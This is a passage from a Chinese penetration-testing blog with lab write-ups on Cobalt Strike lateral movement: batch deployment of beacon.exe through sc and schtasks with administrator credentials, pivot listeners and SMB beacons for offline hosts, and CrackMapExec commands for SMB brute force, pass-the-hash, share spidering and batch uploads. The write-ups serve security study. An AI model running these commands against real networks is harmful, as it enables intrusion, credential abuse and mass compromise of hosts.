<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154448333.png" alt="image-20200831154448333"></p>
<p>​            将生成的文件上传到边界主机上</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154713116.png" alt="image-20200831154713116"></p>
<p>​        使用sc来批量上线，至于login_success.txt那个文件怎么来的，参考WMI利用的那种方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i create xxxxxxxxxxxxxxxxxxxxxxxx binpath&#x3D; &quot;c:\windows\temp\beacon.exe&quot;  &amp;&amp; sc \\%i start xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155355171.png" alt="image-20200831155355171"></p>
<p>​        使用完以后，记得要将这个服务删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i delete xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155845466.png" alt="image-20200831155845466"></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>​        我们也可以使用计划任务来批量横向渗透，至于前面生成shell的过程就不演示了，我们这里还是考虑目标主机是断网的一个状态，所以还是要创建一个pivot listener，生成一个Stageless类型的shell，上传到目标边界主机。使用如下命令来创建并执行计划任务上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; schtasks &#x2F;create &#x2F;s %i &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;xxxxxxxxxxx&quot; &#x2F;tr &quot;c:\windows\temp\beacon.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 &amp;&amp; schtasks &#x2F;run &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; schtasks &#x2F;query &#x2F;s %i &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxxx&quot; | findstr &quot;xxxxxxxxxxx&quot; &amp;&amp; schtasks &#x2F;delete &#x2F;F &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831165538229.png" alt="image-20200831165538229"></p>
<p>​        <strong>使用计划任务有一个限制，就是我们启动计划任务的用户必须是在线的状态，如果是注销状态或者其他没有登录的状态，则无法正常上线。</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习总结，我们发现仅仅依托cobaltstrike再加上几条命令，即可完成批量上线内网断网主机的目的，需要注意的是使用service来批量横向生成的shell类型要使用service类型，计划任务上线需要目标用户处于登录状态。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网断网主机上线的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-28 17:12:06" itemprop="dateCreated datePublished" datetime="2020-08-28T17:12:06+08:00">2020-08-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-31 12:05:28" itemprop="dateModified" datetime="2020-08-31T12:05:28+08:00">2020-08-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        在进行内网横向移动的过程中我们可能经常会遇到这样的情况，目标内网中的其他主机不出外网，那么我们使用cs直接生成的reverse shell就没有办法使目标内网中的”断网”主机上线，今天我就和大家一起学习如何上线内网的”断网”主机。</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OWA2013:192.168.3.144 192.168.5.55   模拟边界机192.168.5.*这个网段使用nat模式，192.168.3.*使用仅主机模式</span><br><span class="line">ser-web:192.168.3.73 模拟内网断网机</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-listener"><a href="#Pivot-listener" class="headerlink" title="Pivot listener"></a>Pivot listener</h3><p><strong>建立Pivot listener</strong></p>
<p>​        首先让边界主机OWA2013上线,上线后对着边界机右键，选择pivoting-&gt;Listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180723949.png" alt="image-20200828180723949"></p>
<p>​        配置过程中需要注意，这里的<strong>Listen host要选择和内网主机所在一个段所对应的ip</strong>，我这里是192.168.3.144</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180840537.png" alt="image-20200828180840537"></p>
<p>​        <img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181006859.png" alt="image-20200828181006859"></p>
<p>​            Pivot listener生成好以后，选择Packages-&gt;windows executalbe(s)</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181100073.png" alt="image-20200828181100073"></p>
<p>​        配置过程中Listener选择我们刚生成的Pivot listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181152418.png" alt="image-20200828181152418"></p>
<p>​        假设我们这里已经拿到了内网断网主机的密码，使用ipc进行连接。</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181857058.png" alt="image-20200828181857058"></p>
<p>​        在文件管理这里将生成的文件上传到断网主机</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182328347.png" alt="image-20200828182328347"></p>
<p>​        使用remote exec wmi模块去执行上传的exe</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182839924.png" alt="image-20200828182839924"></p>
<p>​        目标主机上线，这里有一个小点需要注意，就是上线的这台断网机只要我们不进行交互默认的last时间就是一直增长的，这里不需要管这个超时时间的问题，需要的时候执行命令就可以了</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182918650.png" alt="image-20200828182918650"></p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828183126947.png" alt="image-20200828183126947"></p>
<h3 id="smb-beacon"><a href="#smb-beacon" class="headerlink" title="smb beacon"></a>smb beacon</h3><p><strong>什么是smb beacon？</strong></p>
<p>​        SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。 因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p>
<p><strong>什么是命名管道？</strong></p>
<p>​        “命名管道” 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 SMB 协议的进程间通信（Internet Process Connection - IPC）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在<strong>跨越一个网络的不同计算机的不同进程之间</strong>，支持可靠的、单向或双向的数据通信传输。和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。</p>
<p><strong>命名规范</strong><br>命名管道的命名是采用的 UNC 格式：\Server\Pipe[Path]Name 的。</p>
<p>第一部分\Server指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 pipe 是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分[Path]Name则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831103821108.png" alt="image-20200831103821108"></p>
<p><strong>利用条件</strong></p>
<ul>
<li>目标开放445端口</li>
<li>得知目标主机账号密码并建立ipc连接</li>
</ul>
<p><strong>如何使用smb beacon</strong></p>
<p>​        首先我们创建一个smb的listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101527143.png" alt="image-20200831101527143"></p>
<p>​        我们再通过ipc和内网的断网主机192.168.3.73建立连接</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101635873.png" alt="image-20200831101635873"></p>
<p>​        建立连接后通过jump命令来让192.168.3.73这台断网主机上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 smb</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101807854.png" alt="image-20200831101807854"></p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101834919.png" alt="image-20200831101834919"></p>
<p>​        上线后根据自己的需要执行对应的操作即可</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101901136.png" alt="image-20200831101901136"></p>
<p>​        当使用结束后，可以使用unlink命令取消和该内网主机的连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102021398.png" alt="image-20200831102021398"></p>
<p>​        当想再次让该断网主机上线，使用link命令连接即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102234598.png" alt="image-20200831102234598"></p>
<p><strong>Pivot listener和smb beacon在使用上的区别</strong></p>
<ul>
<li><p>使用pivot listener可以使用生成executables来上线，也可以使用jumpexec的方式上线</p>
<p>​    首先创建一个pivot listener test666</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114634920.png" alt="image-20200831114634920"></p>
<p>​        配置这里还是要注意应该选择和断网机所在一个C段的ip，我这里是192.168.3.144</p>
</li>
</ul>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114730991.png" alt="image-20200831114730991"></p>
<p>​            使用ipc和目标主机建立连接，使用jump psexec来让目标主机上线，test666为刚刚创建的pivote listener的名字</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115052331.png" alt="image-20200831115052331"></p>
<p>​        成功上线</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115201232.png" alt="image-20200831115201232"></p>
<ul>
<li>使用smb beacon可以使用jumpexec的方式上线，但不能使用生成executables来上线</li>
</ul>
<p>Attacks-&gt;packages-&gt;windows executable(s),listener选择smb</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831112921031.png" alt="image-20200831112921031"></p>
<p>​        将生成的文件上传到目标主机</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831113055853.png" alt="image-20200831113055853"></p>
<p>​        使用remote-exec来执行beacon.exe</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114043504.png" alt="image-20200831114043504"></p>
<p>​        目标主机成功执行beacon.exe，但是并不能上线</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114118504.png" alt="image-20200831114118504"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我总结一下这两种上线方式的使用区别</p>
<ul>
<li>pivot listener主要使用端口转发的方式来上线断网主机，这种方式会在我们的边界主机上开放一个端口，如果目标内网存在防火墙，则有可能无法使用这种方式来进行横向移动，但是使用这种方式既可以使用生成exe并执行的方式来上线，也可以使用psexec的方式来上线断网机。</li>
<li>使用smb beacon仅仅需要可以和目标的445端口进行通信即可，不需要额外开启其他端口，并且使用smb上线可以规避防火墙。但是这种方式不能使用生成exe并执行的方式上线，只能通过使用psexec的方式上线。</li>
</ul>
<p><strong>参考文章</strong></p>
<p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/" target="_blank" rel="noopener">Cobaltstrike SMB beacon(命名管道相关知识)</a></p>
<p><a href="http://blog.leanote.com/post/snowming/8b7ce0f84c03" target="_blank" rel="noopener">CS 4.0 SMB Beacon</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网横向移动套件的利用总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-26 17:15:32" itemprop="dateCreated datePublished" datetime="2020-08-26T17:15:32+08:00">2020-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-31 13:34:03" itemprop="dateModified" datetime="2020-08-31T13:34:03+08:00">2020-08-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过上篇文章我们了解了关于内网横向移动的常用方法，但是实战中去使用这些方法往往效率比较低，并且已经有很多大佬发现了这一点并且针对于每种横向移动的方法写出了横向移动的套件。熟悉这些横向移动套件的使用有助于提高我们渗透的速度。因此学习大佬们横向移动套件的使用是非常有必要的，下面我将和大家一起学习关于内网横向移动套件的使用。</p>
<h3 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a>Crackmapexec</h3><p>​        Crackmapexec是一款由python开发的横向移动利用工具，网上也有人打包好了它的<a href="https://github.com/maaaaz/CrackMapExecWin" target="_blank" rel="noopener">windows版本</a>，这个是2.x版本的打包,虽然版本比较旧，但是基本的功能都有了</p>
<p>​        在横向移动之前，可以去扫描开放445端口的主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105034304.png" alt="image-20200827105034304"></p>
<p><strong>查看主机的共享</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe host.txt -t 1 -u administrator -p Admin123456 --share</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105808677.png" alt="image-20200827105808677"></p>
<p><strong>查看当前主机的用户</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111211507.png" alt="image-20200827111211507"></p>
<p><strong>主机都有什么盘</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --disk</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111346074.png" alt="image-20200827111346074"></p>
<p><strong>批量smb爆破</strong></p>
<p>​        首先我们先扫描那些主机开放了445端口，再将开放445的ip保存到一个txt中，使用下面的命令进行爆破。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826193844481.png" alt="image-20200826193844481"></p>
<p><strong>爬取用户目录下包含某个关键字的文件名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxx -t 1 host.txt  --spider Users --depth 10 --pattern username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827120109187.png" alt="image-20200827120109187"></p>
<p><strong>批量hash传递</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194130572.png" alt="image-20200826194130572"></p>
<p><strong>批量文件操作</strong></p>
<p>​        批量上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt  --upload C:\Users\xxx\Desktop\SharpMove.exe  \\Windows\\Temp\\whoami.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134605698.png" alt="image-20200827134605698"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134523163.png" alt="image-20200827134523163"></p>
<p>​        批量查看文件</p>
